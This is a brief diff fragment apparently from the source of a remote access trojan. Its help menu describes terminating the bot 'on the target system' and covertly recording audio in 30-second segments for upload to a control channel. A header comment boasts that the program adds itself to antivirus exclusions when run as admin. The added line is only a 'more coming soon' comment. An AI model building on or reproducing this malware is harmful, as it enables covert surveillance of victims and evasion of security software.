@@ -33,3 +33,6 @@ MADE IT TO WHERE IF IT IS RAN AS ADMIN IT IMMEDIATELY ADDS IT SELF TO EXCLUSIONS
         {"name": f"{PREFIX}end", "value": "Terminates the bot process on the target system"},
         {"name": f"{PREFIX}help", "value": "Shows this help message"},
         {"name": "Background Audio Recording", "value": "The system automatically records audio in 30-second segments and uploads them to the system's channel"}
+
+
+# MORE COMING SOON
